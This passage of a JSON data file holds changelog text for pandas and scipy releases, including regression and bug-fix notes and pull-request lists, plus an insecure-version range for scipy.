Fixed regression in :meth:`DataFrame.groupby` where aggregation on columns with object types dropped results on those columns (:issue:`42395`, :issue:`43108`)\n- Fixed regression in :meth:`Series.fillna` raising ``TypeError`` when filling ``float`` ``Series`` with list-like fill value having a dtype which couldn't cast lostlessly (like ``float32`` filled with ``float64``) (:issue:`43424`)\n- Fixed regression in :func:`read_csv` raising ``AttributeError`` when the file handle is an ``tempfile.SpooledTemporaryFile`` object (:issue:`43439`)\n- Fixed performance regression in :meth:`core.window.ewm.ExponentialMovingWindow.mean` (:issue:`42333`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_133.performance:\n\nPerformance improvements\n~~~~~~~~~~~~~~~~~~~~~~~~\n- Performance improvement for :meth:`DataFrame.__setitem__` when the key or value is not a :class:`DataFrame`, or key is not list-like (:issue:`43274`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_133.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n- Fixed bug in :meth:`.DataFrameGroupBy.agg` and :meth:`.DataFrameGroupBy.transform` with ``engine=\"numba\"`` where ``index`` data was not being correctly passed into ``func`` (:issue:`43133`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_133.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v1.3.2..v1.3.3\n", "2.2.2": ".. _whatsnew_222:\n\nWhat's new in 2.2.2 (April 10, 2024)\n---------------------------------------\n\nThese are the changes in pandas 2.2.2. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_220.np2_compat:\n\nPandas 2.2.2 is now compatible with numpy 2.0\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nPandas 2.2.2 is the first version of pandas that is generally compatible with the upcoming\nnumpy 2.0 release, and wheels for pandas 2.2.2 will work with both numpy 1.x and 2.x.\n\nOne major caveat is that arrays created with numpy 2.0's new ``StringDtype`` will convert\nto ``object`` dtyped arrays upon :class:`Series`/:class:`DataFrame` creation.\nFull support for numpy 2.0's StringDtype is expected to land in pandas 3.0.\n\nAs usual please report any bugs discovered to our `issue tracker <https://github.com/pandas-dev/pandas/issues/new/choose>`_\n\n.. _whatsnew_222.regressions:\n\nFixed regressions\n~~~~~~~~~~~~~~~~~\n- :meth:`DataFrame.__dataframe__` was producing incorrect data buffers when the a column's type was a pandas nullable on with missing values (:issue:`56702`)\n- :meth:`DataFrame.__dataframe__` was producing incorrect data buffers when the a column's type was a pyarrow nullable on with missing values (:issue:`57664`)\n- Avoid issuing a spurious ``DeprecationWarning`` when a custom :class:`DataFrame` or :class:`Series` subclass method is called (:issue:`57553`)\n- Fixed regression in precision of :func:`to_datetime` with string and ``unit`` input (:issue:`57051`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_222.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n- :meth:`DataFrame.__dataframe__` was producing incorrect data buffers when the column's type was nullable boolean (:issue:`55332`)\n- :meth:`DataFrame.__dataframe__` was showing bytemask instead of bitmask for ``'string[pyarrow]'`` validity buffer (:issue:`57762`)\n- :meth:`DataFrame.__dataframe__` was showing non-null validity buffer (instead of ``None``) ``'string[pyarrow]'`` without missing values (:issue:`57761`)\n- :meth:`DataFrame.to_sql` was failing to find the right table when using the schema argument (:issue:`57539`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_222.other:\n\nOther\n~~~~~\n-\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_222.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v2.2.1..v2.2.2|HEAD\n", "1.2.5": ".. _whatsnew_125:\n\nWhat's new in 1.2.5 (June 22, 2021)\n-----------------------------------\n\nThese are the changes in pandas 1.2.5. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_125.regressions:\n\nFixed regressions\n~~~~~~~~~~~~~~~~~\n- Fixed regression in :func:`concat` between two :class:`DataFrame` where one has an :class:`Index` that is all-None and the other is :class:`DatetimeIndex` incorrectly raising (:issue:`40841`)\n- Fixed regression in :meth:`DataFrame.sum` and :meth:`DataFrame.prod` when ``min_count`` and ``numeric_only`` are both given (:issue:`41074`)\n- Fixed regression in :func:`read_csv` when using ``memory_map=True`` with an non-UTF8 encoding (:issue:`40986`)\n- Fixed regression in :meth:`DataFrame.replace` and :meth:`Series.replace` when the values to replace is a NumPy float array (:issue:`40371`)\n- Fixed regression in :func:`ExcelFile` when a corrupt file is opened but not closed (:issue:`41778`)\n- Fixed regression in :meth:`DataFrame.astype` with ``dtype=str`` failing to convert ``NaN`` in categorical columns (:issue:`41797`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_125.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v1.2.4..v1.2.5|HEAD\n", "1.5.1": ".. _whatsnew_151:\n\nWhat's new in 1.5.1 (October 19, 2022)\n--------------------------------------\n\nThese are the changes in pandas 1.5.1. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_151.groupby_categorical_regr:\n\nBehavior of ``groupby`` with categorical groupers (:issue:`48645`)\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nIn versions of pandas prior to 1.5, ``groupby`` with ``dropna=False`` would still drop\nNA values when the grouper was a categorical dtype. A fix for this was attempted in\n1.5, however it introduced a regression where passing ``observed=False`` and\n``dropna=False`` to ``groupby`` would result in only observed categories. It was found\nthat the patch fixing the ``dropna=False`` bug is incompatible with ``observed=False``,\nand decided that the best resolution is to restore the correct ``observed=False``\nbehavior at the cost of reintroducing the ``dropna=False`` bug.\n\n.. ipython:: python\n\n   df = pd.DataFrame(\n       {\n           \"x\": pd.Categorical([1, None], categories=[1, 2, 3]),\n           \"y\": [3, 4],\n       }\n   )\n   df\n\n*1.5.0 behavior*:\n\n.. code-block:: ipython\n\n   In [3]: # Correct behavior, NA values are not dropped\n           df.groupby(\"x\", observed=True, dropna=False).sum()\n   Out[3]:\n        y\n   x\n   1    3\n   NaN  4\n\n\n   In [4]: # Incorrect behavior, only observed categories present\n           df.groupby(\"x\", observed=False, dropna=False).sum()\n   Out[4]:\n        y\n   x\n   1    3\n   NaN  4\n\n\n*1.5.1 behavior*:\n\n.. ipython:: python\n\n   # Incorrect behavior, NA values are dropped\n   df.groupby(\"x\", observed=True, dropna=False).sum()\n\n   # Correct behavior, unobserved categories present (NA values still dropped)\n   df.groupby(\"x\", observed=False, dropna=False).sum()\n\n.. _whatsnew_151.regressions:\n\nFixed regressions\n~~~~~~~~~~~~~~~~~\n- Fixed Regression in :meth:`Series.__setitem__` casting ``None`` to ``NaN`` for object dtype (:issue:`48665`)\n- Fixed Regression in :meth:`DataFrame.loc` when setting values as a :class:`DataFrame` with all ``True`` indexer (:issue:`48701`)\n- Regression in :func:`.read_csv` causing an ``EmptyDataError`` when using an UTF-8 file handle that was already read from (:issue:`48646`)\n- Regression in :func:`to_datetime` when ``utc=True`` and ``arg`` contained timezone naive and aware arguments raised a ``ValueError`` (:issue:`48678`)\n- Fixed regression in :meth:`DataFrame.loc` raising ``FutureWarning`` when setting an empty :class:`DataFrame` (:issue:`48480`)\n- Fixed regression in :meth:`DataFrame.describe` raising ``TypeError`` when result contains ``NA`` (:issue:`48778`)\n- Fixed regression in :meth:`DataFrame.plot` ignoring invalid ``colormap`` for ``kind=\"scatter\"`` (:issue:`48726`)\n- Fixed regression in :meth:`MultiIndex.values` resetting ``freq`` attribute of underlying :class:`Index` object (:issue:`49054`)\n- Fixed performance regression in :func:`factorize` when ``na_sentinel`` is not ``None`` and ``sort=False`` (:issue:`48620`)\n- Fixed regression causing an ``AttributeError`` during warning emitted if the provided table name in :meth:`DataFrame.to_sql` and the table name actually used in the database do not match (:issue:`48733`)\n- Fixed regression in :func:`to_datetime` when ``arg`` was a date string with nanosecond and ``format`` contained ``%f`` would raise a ``ValueError`` (:issue:`48767`)\n- Fixed regression in :func:`testing.assert_frame_equal` raising for :class:`MultiIndex` with :class:`Categorical` and ``check_like=True`` (:issue:`48975`)\n- Fixed regression in :meth:`DataFrame.fillna` replacing wrong values for ``datetime64[ns]`` dtype and ``inplace=True`` (:issue:`48863`)\n- Fixed :meth:`.DataFrameGroupBy.size` not returning a Series when ``axis=1`` (:issue:`48738`)\n- Fixed Regression in :meth:`.DataFrameGroupBy.apply` when user defined function is called on an empty dataframe (:issue:`47985`)\n- Fixed regression in :meth:`DataFrame.apply` when passing non-zero ``axis`` via keyword argument (:issue:`48656`)\n- Fixed regression in :meth:`Series.groupby` and :meth:`DataFrame.groupby` when the grouper is a nullable data type (e.g. :class:`Int64`) or a PyArrow-backed string array, contains null values, and ``dropna=False`` (:issue:`48794`)\n- Fixed performance regression in :meth:`Series.isin` with mismatching dtypes (:issue:`49162`)\n- Fixed regression in :meth:`DataFrame.to_parquet` raising when file name was specified as ``bytes`` (:issue:`48944`)\n- Fixed regression in :class:`ExcelWriter` where the ``book`` attribute could no longer be set; however setting this attribute is now deprecated and this ability will be removed in a future version of pandas (:issue:`48780`)\n- Fixed regression in :meth:`DataFrame.corrwith` when computing correlation on tied data with ``method=\"spearman\"`` (:issue:`48826`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_151.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n- Bug in :meth:`Series.__getitem__` not falling back to positional for integer keys and boolean :class:`Index` (:issue:`48653`)\n- Bug in :meth:`DataFrame.to_hdf` raising ``AssertionError`` with boolean index (:issue:`48667`)\n- Bug in :func:`testing.assert_index_equal` for extension arrays with non matching ``NA`` raising ``ValueError`` (:issue:`48608`)\n- Bug in :meth:`DataFrame.pivot_table` raising unexpected ``FutureWarning`` when setting datetime column as index (:issue:`48683`)\n- Bug in :meth:`DataFrame.sort_values` emitting unnecessary ``FutureWarning`` when called on :class:`DataFrame` with boolean sparse columns (:issue:`48784`)\n- Bug in :class:`.arrays.ArrowExtensionArray` with a comparison operator to an invalid object would not raise a ``NotImplementedError`` (:issue:`48833`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_151.other:\n\nOther\n~~~~~\n- Avoid showing deprecated signatures when introspecting functions with warnings about arguments becoming keyword-only (:issue:`48692`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_151.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v1.5.0..v1.5.1\n"}}, {"name": "scipy", "insecurity": [">=0,<0.12.1"], "changelog": {"1.5.1": "-----------------------\n\n* `12280 <https://github.com/scipy/scipy/pull/12280>`__: BUG: Fixes gh-12218, TypeError converting int to float inside...\n* `12336 <https://github.com/scipy/scipy/pull/12336>`__: BUG: KDTree should reject complex input points\n* `12344 <https://github.com/scipy/scipy/pull/12344>`__: MAINT: Don't use numpy's aliases of Python builtin objects.\n* `12407 <https://github.com/scipy/scipy/pull/12407>`__: DOC: Fix docstring for dist param in anderson function\n* `12410 <https://github.com/scipy/scipy/pull/12410>`__: CI: Run the Azure Windows Python36 32bit tests with mode 'fast'\n* `12421 <https://github.com/scipy/scipy/pull/12421>`__: Fix regression in scipy 1.5.0 in dendogram when labels is a numpy...\n* `12462 <https://github.com/scipy/scipy/pull/12462>`__: MAINT: move distributor_init import after __config__ import\n\n\n\n==========================\n", "1.3.2": "-----------------------\n\n* `10498 <https://github.com/scipy/scipy/pull/10498>`__: TST: optimize: fixed \\`linprog\\` \\`\"disp\": True\\` bug\n* `10536 <https://github.com/scipy/scipy/pull/10536>`__: CI: add 3.8-dev to travis\n* `10671 <https://github.com/scipy/scipy/pull/10671>`__: BUG: stats: Fix the formula for the variance of the noncentral...\n* `10693 <https://github.com/scipy/scipy/pull/10693>`__: BUG: ScalarFunction stores original array\n* `10700 <https://github.com/scipy/scipy/pull/10700>`__: BUG: sparse: Loosen checks on sparse fancy assignment\n* `10709 <https://github.com/scipy/scipy/pull/10709>`__: BUG: Fix floyd_warshall to support zero-weight edges\n* `10756 <https://github.com/scipy/scipy/pull/10756>`__: BUG: optimize: ensure solvers exit with success=False for nan...\n* `10833 <https://github.com/scipy/scipy/pull/10833>`__: BUG: Fix subspace_angles for complex values\n* `10882 <https://github.com/scipy/scipy/pull/10882>`__: BUG: sparse/arpack: fix incorrect code for complex hermitian...\n* `10891 <https://github.com/scipy/scipy/pull/10891>`__: BUG: make C-implemented root finders work with functools.lru_cache\n* `10906 <https://github.com/scipy/scipy/pull/10906>`__: BUG: sparse/linalg: fix expm for np.matrix inputs\n* `10917 <https://github.com/scipy/scipy/pull/10917>`__: CI: fix travis osx CI\n* `10930 <https://github.com/scipy/scipy/pull/10930>`__: MAINT: Updates for 3.8\n* `10938 <https://github.com/scipy/scipy/pull/10938>`__: MAINT: Add Python 3.8 to pyproject.toml\n* `10943 <https://github.com/scipy/scipy/pull/10943>`__: BLD: update Cython version to 0.29.13\n* `10961 <https://github.com/scipy/scipy/pull/10961>`__: BUG: Fix signal.unique_roots\n* `10971 <https://github.com/scipy/scipy/pull/10971>`__: MAINT: use 3.8 stable in CI\n* `10977 <https://github.com/scipy/scipy/pull/10977>`__: DOC: Fix typo in sp.stats.wilcoxon docsting\n* `11025 <https://github.com/scipy/scipy/pull/11025>`__: Update _peak_finding.py\n\n\n==========================\n", "1.11.3": "------------------------\n\n* `17633 <https://github.com/scipy/scipy/pull/17633>`__: BUG: add infeasibility checks to min_weight_full_bipartite_matching\n* `18784 <https://github.com/scipy/scipy/pull/18784>`__: BUG: Allow johnsonsu parameters to be floats\n* `18913 <https://github.com/scipy/scipy/pull/18913>`__: BUG: sparse.csgraph: Support int64 indices in traversal.pyx\n* `18924 <https://github.com/scipy/scipy/pull/18924>`__: BUG: Fix python3.12 distutils dev.py build\n* `18956 <https://github.com/scipy/scipy/pull/18956>`__: BUG: trust-constr Bounds exclusive\n* `19076 <https://github.com/scipy/scipy/pull/19076>`__: MAINT: should not be using np.float64() on arrays\n* `19084 <https://github.com/scipy/scipy/pull/19084>`__: REL, MAINT: prep for 1.11.3\n* `19111 <https://github.com/scipy/scipy/pull/19111>`__: BUG: Fixes #19103 by adding back make_strictly_feasible to lsq...\n* `19123 <https://github.com/scipy/scipy/pull/19123>`__: BLD: Avoid absolute pathnames in .pyx files\n* `19135 <https://github.com/scipy/scipy/pull/19135>`__: MAINT: signal: Remove the cval parameter from the private function...\n* `19139 <https://github.com/scipy/scipy/pull/19139>`__: BLD: revert to using published wheels [wheel build]\n* `19156 <https://github.com/scipy/scipy/pull/19156>`__: BUG: Support sparse arrays in scipy.sparse.csgraph.laplacian\n* `19199 <https://github.com/scipy/scipy/pull/19199>`__: MAINT: stats.CovViaEigendecomposition: fix \\`_LA\\` attribute...\n* `19200 <https://github.com/scipy/scipy/pull/19200>`__: TST: fix \\`TestODR.test_implicit\\` test failure with tolerance...\n* `19208 <https://github.com/scipy/scipy/pull/19208>`__: BUG: freqz rfft grid fix\n* `19280 <https://github.com/scipy/scipy/pull/19280>`__: MAINT: newton, make sure x0 is an inexact type\n* `19286 <https://github.com/scipy/scipy/pull/19286>`__: BUG: stats: fix build failure due to incorrect Boost policies...\n* `19290 <https://github.com/scipy/scipy/pull/19290>`__: BLD: add float.h include to \\`_fpumode.c\\`, fixes Clang on Windows...\n* `19299 <https://github.com/scipy/scipy/pull/19299>`__: MAINT: fix libquadmath licence\n\n\n==========================\n", "1.6.3": "-----------------------\n\n* `13755 <https://github.com/scipy/scipy/pull/13755>`__: CI: fix the matplotlib warning emitted during builing docs\n* `13773 <https://github.com/scipy/scipy/pull/13773>`__: BUG: Divide by zero in yule dissimilarity of constant vectors\n* `13799 <https://github.com/scipy/scipy/pull/13799>`__: CI/MAINT: deprecated np.typeDict\n* `13819 <https://github.com/scipy/scipy/pull/13819>`__: substitute np.math.factorial with math.factorial\n* `13895 <https://github.com/scipy/scipy/pull/13895>`__: TST: add random seeds in Rotation module\n\n\n==========================\n", "0.19.0": "------------------------\n\n- `2908 <https://github.com/scipy/scipy/pull/2908>`__: Scipy 1.0 Roadmap\n- `3174 <https://github.com/scipy/scipy/pull/3174>`__: add b-splines\n- `4606 <https://github.com/scipy/scipy/pull/4606>`__: ENH: Add a unit impulse waveform function\n- `5608 <https://github.com/scipy/scipy/pull/5608>`__: Adds keyword argument to choose faster convolution method\n- `5647 <https://github.com/scipy/scipy/pull/5647>`__: ENH: Faster count_neighour in cKDTree / + weighted input data\n- `6021 <https://github.com/scipy/scipy/pull/6021>`__: Netcdf append\n- `6058 <https://github.com/scipy/scipy/pull/6058>`__: ENH: scipy.signal - Add stft and istft\n- `6059 <https://github.com/scipy/scipy/pull/6059>`__: ENH: More accurate signal.freqresp for zpk systems\n- `6195 <https://github.com/scipy/scipy/pull/6195>`__: ENH: Cython interface for special\n- `6234 <https://github.com/scipy/scipy/pull/6234>`__: DOC: Fixed a typo in ward() help\n- `6261 <https://github.com/scipy/scipy/pull/6261>`__: ENH: add docstring and clean up code for signal.normalize\n- `6270 <https://github.com/scipy/scipy/pull/6270>`__: MAINT: special: add tests for cdflib\n- `6271 <https://github.com/scipy/scipy/pull/6271>`__: Fix for scipy.cluster.hierarchy.is_isomorphic\n- `6273 <https://github.com/scipy/scipy/pull/6273>`__: optimize: rewrite while loops as for loops\n- `6279 <https://github.com/scipy/scipy/pull/6279>`__: MAINT: Bessel tweaks\n- `6291 <https://github.com/scipy/scipy/pull/6291>`__: Fixes gh-6219: remove runtime warning from genextreme distribution\n- `6294 <https://github.com/scipy/scipy/pull/6294>`__: STY: Some PEP8 and cleaning up imports in stats/_continuous_distns.py\n- `6297 <https://github.com/scipy/scipy/pull/6297>`__: Clarify docs in misc/__init__.py\n- `6300 <https://github.com/scipy/scipy/pull/6300>`__: ENH: sparse: Loosen input validation for `diags` with empty inputs\n- `6301 <https://github.com/scipy/scipy/pull/6301>`__: BUG: standardizes check_finite behavior re optional weights,...\n- `6303 <https://github.com/scipy/scipy/pull/6303>`__: Fixing example in _lazyselect docstring.\n- `6307 <https://github.com/scipy/scipy/pull/6307>`__: MAINT: more improvements to gammainc/gammaincc\n- `6308 <https://github.com/scipy/scipy/pull/6308>`__: Clarified documentation of hypergeometric distribution.\n- `6309 <https://github.com/scipy/scipy/pull/6309>`__: BUG: stats: Improve calculation of the Anderson-Darling statistic.\n- `6315 <https://github.com/scipy/scipy/pull/6315>`__: ENH: Descending order of x in PPoly\n- `6317 <https://github.com/scipy/scipy/pull/6317>`__: ENH: stats: Add support for nan_policy to stats.median_test\n- `6321 <https://github.com/scipy/scipy/pull/6321>`__: TST: fix a typo in test name\n- `6328 <https://github.com/scipy/scipy/pull/6328>`__: ENH: sosfreqz\n- `6335 <https://github.com/scipy/scipy/pull/6335>`__: Define LinregressResult outside of linregress\n- `6337 <https://github.com/scipy/scipy/pull/6337>`__: In anderson test, added support for right skewed gumbel distribution.\n- `6341 <https://github.com/scipy/scipy/pull/6341>`__: Accept several spellings for the curve_fit max number of function...\n- `6342 <https://github.com/scipy/scipy/pull/6342>`__: DOC: cluster: clarify hierarchy.linkage usage\n- `6352 <https://github.com/scipy/scipy/pull/6352>`__: DOC: removed brentq from its own 'see also'\n- `6362 <https://github.com/scipy/scipy/pull/6362>`__: ENH: stats: Use explicit formulas for sf, logsf, etc in weibull...\n- `6369 <https://github.com/scipy/scipy/pull/6369>`__: MAINT: special: add a comment to hyp0f1_complex\n- `6375 <https://github.com/scipy/scipy/pull/6375>`__: Added the multinomial distribution.\n- `6387 <https://github.com/scipy/scipy/pull/6387>`__: MAINT: special: improve accuracy of ellipj's `dn` at quarter...\n- `6388 <https://github.com/scipy/scipy/pull/6388>`__: BenchmarkGlobal - getting it to work in Python3\n- `6394 <https://github.com/scipy/scipy/pull/6394>`__: ENH: scipy.sparse: add save and load functions for sparse matrices\n- `6400 <https://github.com/scipy/scipy/pull/6400>`__: MAINT: moves global benchmark run from setup_cache to track_all\n- `6403 <https://github.com/scipy/scipy/pull/6403>`__: ENH: seed kwd for basinhopping. Closes #6278\n- `6404 <https://github.com/scipy/scipy/pull/6404>`__: ENH: signal: added irrnotch and iirpeak functions.\n- `6406 <https://github.com/scipy/scipy/pull/6406>`__: ENH: special: extend `sici`/`shichi` to complex arguments\n- `6407 <https://github.com/scipy/scipy/pull/6407>`__: ENH: Window functions should not accept non-integer or negative...\n- `6408 <https://github.com/scipy/scipy/pull/6408>`__: MAINT: _differentialevolution now uses _lib._util.check_random_state\n- `6427 <https://github.com/scipy/scipy/pull/6427>`__: MAINT: Fix gmpy build & test that mpmath uses gmpy\n- `6439 <https://github.com/scipy/scipy/pull/6439>`__: MAINT: ndimage: update callback function c api\n- `6443 <https://github.com/scipy/scipy/pull/6443>`__: BUG: Fix volume computation in incremental mode\n- `6447 <https://github.com/scipy/scipy/pull/6447>`__: Fixes issue #6413 - Minor documentation fix in the entropy function...\n- `6448 <https://github.com/scipy/scipy/pull/6448>`__: ENH: Add halfspace mode to Qhull\n- `6449 <https://github.com/scipy/scipy/pull/6449>`__: ENH: rtol and atol for differential_evolution termination fixes...\n- `6453 <https://github.com/scipy/scipy/pull/6453>`__: DOC: Add some See Also links between similar functions\n- `6454 <https://github.com/scipy/scipy/pull/6454>`__: DOC: linalg: clarify callable signature in `ordqz`\n- `6457 <https://github.com/scipy/scipy/pull/6457>`__: ENH: spatial: enable non-double dtypes in squareform\n- `6459 <https://github.com/scipy/scipy/pull/6459>`__: BUG: Complex matrices not handled correctly by expm_multiply...\n- `6465 <https://github.com/scipy/scipy/pull/6465>`__: TST DOC Window docs, tests, etc.\n- `6469 <https://github.com/scipy/scipy/pull/6469>`__: ENH: linalg: better handling of infinite eigenvalues in `eig`/`eigvals`\n- `6475 <https://github.com/scipy/scipy/pull/6475>`__: DOC: calling interp1d/interp2d with NaNs is undefined\n- `6477 <https://github.com/scipy/scipy/pull/6477>`__: Document magic numbers in optimize.py\n- `6481 <https://github.com/scipy/scipy/pull/6481>`__: TST: Supress some warnings from test_windows\n- `6485 <https://github.com/scipy/scipy/pull/6485>`__: DOC: spatial: correct typo in procrustes\n- `6487 <https://github.com/scipy/scipy/pull/6487>`__: Fix Bray-Curtis formula in pdist docstring\n- `6493 <https://github.com/scipy/scipy/pull/6493>`__: ENH: Add covariance functionality to scipy.optimize.curve_fit\n- `6494 <https://github.com/scipy/scipy/pull/6494>`__: ENH: stats: Use log1p() to improve some calculations.\n- `6495 <https://github.com/scipy/scipy/pull/6495>`__: BUG: Use MST algorithm instead of SLINK for single linkage clustering\n- `6497 <https://github.com/scipy/scipy/pull/6497>`__: MRG: Add minimum_phase filter function\n- `6505 <https://github.com/scipy/scipy/pull/6505>`__: reset scipy.signal.resample window shape to 1-D\n- `6507 <https://github.com/scipy/scipy/pull/6507>`__: BUG: linkage: Raise exception if y contains non-finite elements\n- `6509 <https://github.com/scipy/scipy/pull/6509>`__: ENH: _lib: add common machinery for low-level callback functions\n- `6520 <https://github.com/scipy/scipy/pull/6520>`__: scipy.sparse.base.__mul__ non-numpy/scipy objects with 'shape'...\n- `6522 <https://github.com/scipy/scipy/pull/6522>`__: Replace kl_div by rel_entr in entropy\n- `6524 <https://github.com/scipy/scipy/pull/6524>`__: DOC: add next_fast_len to list of functions\n- `6527 <https://github.com/scipy/scipy/pull/6527>`__: DOC: Release notes to reflect the new covariance feature in optimize.curve_fit\n- `6532 <https://github.com/scipy/scipy/pull/6532>`__: ENH: Simplify _cos_win, document it, add symmetric/periodic arg\n- `6535 <https://github.com/scipy/scipy/pull/6535>`__: MAINT: sparse.csgraph: updating old cython loops\n- `6540 <https://github.com/scipy/scipy/pull/6540>`__: DOC: add to documentation of orthogonal polynomials\n- `6544 <https://github.com/scipy/scipy/pull/6544>`__: TST: Ensure tests for scipy._lib are run by scipy.test()\n- `6546 <https://github.com/scipy/scipy/pull/6546>`__: updated docstring of stats.linregress\n- `6553 <https://github.com/scipy/scipy/pull/6553>`__: commited changes that I originally submitted for scipy.signal.cspline\u2026\n- `6561 <https://github.com/scipy/scipy/pull/6561>`__: BUG: modify signal.find_peaks_cwt() to return array and accept...\n- `6562 <https://github.com/scipy/scipy/pull/6562>`__: DOC: Negative binomial distribution clarification\n- `6563 <https://github.com/scipy/scipy/pull/6563>`__: MAINT: be more liberal in requiring numpy\n- `6567 <https://github.com/scipy/scipy/pull/6567>`__: MAINT: use xrange for iteration in differential_evolution fixes...\n- `6572 <https://github.com/scipy/scipy/pull/6572>`__: BUG: \"sp.linalg.solve_discrete_are\" fails for random data\n- `6578 <https://github.com/scipy/scipy/pull/6578>`__: BUG: misc: allow both cmin/cmax and low/high params in bytescale\n- `6581 <https://github.com/scipy/scipy/pull/6581>`__: Fix some unfortunate typos\n- `6582 <https://github.com/scipy/scipy/pull/6582>`__: MAINT: linalg: make handling of infinite eigenvalues in `ordqz`...\n- `6585 <https://github.com/scipy/scipy/pull/6585>`__: DOC: interpolate: correct seealso links to ndimage\n- `6588 <https://github.com/scipy/scipy/pull/6588>`__: Update docstring of scipy.spatial.distance_matrix\n- `6592 <https://github.com/scipy/scipy/pull/6592>`__: DOC: Replace 'first' by 'smallest' in mode\n- `6593 <https://github.com/scipy/scipy/pull/6593>`__: MAINT: remove scipy.weave submodule\n- `6594 <https://github.com/scipy/scipy/pull/6594>`__: DOC: distance.squareform: fix html docs, add note about dtype...\n- `6598 <https://github.com/scipy/scipy/pull/6598>`__: [DOC] Fix incorrect error message in medfilt2d\n- `6599 <https://github.com/scipy/scipy/pull/6599>`__: MAINT: linalg: turn a `solve_discrete_are` test back on\n- `6600 <https://github.com/scipy/scipy/pull/6600>`__: DOC: Add SOS goals to roadmap\n- `6601 <https://github.com/scipy/scipy/pull/6601>`__: DEP: Raise minimum numpy version to 1.8.2\n- `6605 <https://github.com/scipy/scipy/pull/6605>`__: MAINT: 'new' module is deprecated, don't use it\n- `6607 <https://github.com/scipy/scipy/pull/6607>`__: DOC: add note on change in wheel dependency on numpy and pip...\n- `6609 <https://github.com/scipy/scipy/pull/6609>`__: Fixes #6602 - Typo in docs\n- `6616 <https://github.com/scipy/scipy/pull/6616>`__: ENH: generalization of continuous and discrete Riccati solvers...\n- `6621 <https://github.com/scipy/scipy/pull/6621>`__: DOC: improve cluster.hierarchy docstrings.\n- `6623 <https://github.com/scipy/scipy/pull/6623>`__: CS matrix prune method should copy data from large unpruned arrays\n- `6625 <https://github.com/scipy/scipy/pull/6625>`__: DOC: special: complete documentation of `eval_*` functions\n- `6626 <https://github.com/scipy/scipy/pull/6626>`__: TST: special: silence some deprecation warnings\n- `6631 <https://github.com/scipy/scipy/pull/6631>`__: fix parameter name doc for discrete distributions\n- `6632 <https://github.com/scipy/scipy/pull/6632>`__: MAINT: stats: change some instances of `special` to `sc`\n- `6633 <https://github.com/scipy/scipy/pull/6633>`__: MAINT: refguide: py2k long integers are equal to py3k integers\n- `6638 <https://github.com/scipy/scipy/pull/6638>`__: MAINT: change type declaration in cluster.linkage, prevent overflow\n- `6640 <https://github.com/scipy/scipy/pull/6640>`__: BUG: fix issue with duplicate values used in cluster.vq.kmeans\n- `6641 <https://github.com/scipy/scipy/pull/6641>`__: BUG: fix corner case in cluster.vq.kmeans for large thresholds\n- `6643 <https://github.com/scipy/scipy/pull/6643>`__: MAINT: clean up truncation modes of dendrogram\n- `6645 <https://github.com/scipy/scipy/pull/6645>`__: MAINT: special: rename `*_roots` functions\n- `6646 <https://github.com/scipy/scipy/pull/6646>`__: MAINT: clean up mpmath imports\n- `6647 <https://github.com/scipy/scipy/pull/6647>`__: DOC: add sqrt to Mahalanobis description for pdist\n- `6648 <https://github.com/scipy/scipy/pull/6648>`__: DOC: special: add a section on `cython_special` to the tutorial\n- `6649 <https://github.com/scipy/scipy/pull/6649>`__: ENH: Added scipy.spatial.distance.directed_hausdorff\n- `6650 <https://github.com/scipy/scipy/pull/6650>`__: DOC: add Sphinx roles for DOI and arXiv links\n- `6651 <https://github.com/scipy/scipy/pull/6651>`__: BUG: mstats: make sure mode(..., None) does not modify its input\n- `6652 <https://github.com/scipy/scipy/pull/6652>`__: DOC: special: add section to tutorial on functions not in special\n- `6653 <https://github.com/scipy/scipy/pull/6653>`__: ENH: special: add the Wright Omega function\n- `6656 <https://github.com/scipy/scipy/pull/6656>`__: ENH: don't coerce input to double with custom metric in cdist...\n- `6658 <https://github.com/scipy/scipy/pull/6658>`__: Faster/shorter code for computation of discordances\n- `6659 <https://github.com/scipy/scipy/pull/6659>`__: DOC: special: make __init__ summaries and html summaries match\n- `6661 <https://github.com/scipy/scipy/pull/6661>`__: general.rst: Fix a typo\n- `6664 <https://github.com/scipy/scipy/pull/6664>`__: TST: Spectral functions' window correction factor\n- `6665 <https://github.com/scipy/scipy/pull/6665>`__: [DOC] Conditions on v in RectSphereBivariateSpline\n- `6668 <https://github.com/scipy/scipy/pull/6668>`__: DOC: Mention negative masses for center of mass\n- `6675 <https://github.com/scipy/scipy/pull/6675>`__: MAINT: special: remove outdated README\n- `6677 <https://github.com/scipy/scipy/pull/6677>`__: BUG: Fixes computation of p-values.\n- `6679 <https://github.com/scipy/scipy/pull/6679>`__: BUG: optimize: return correct Jacobian for method 'SLSQP' in...\n- `6680 <https://github.com/scipy/scipy/pull/6680>`__: ENH: Add structural rank to sparse.csgraph\n- `6686 <https://github.com/scipy/scipy/pull/6686>`__: TST: Added Airspeed Velocity benchmarks for SphericalVoronoi\n- `6687 <https://github.com/scipy/scipy/pull/6687>`__: DOC: add section \"deciding on new features\" to developer guide.\n- `6691 <https://github.com/scipy/scipy/pull/6691>`__: ENH: Clearer error when 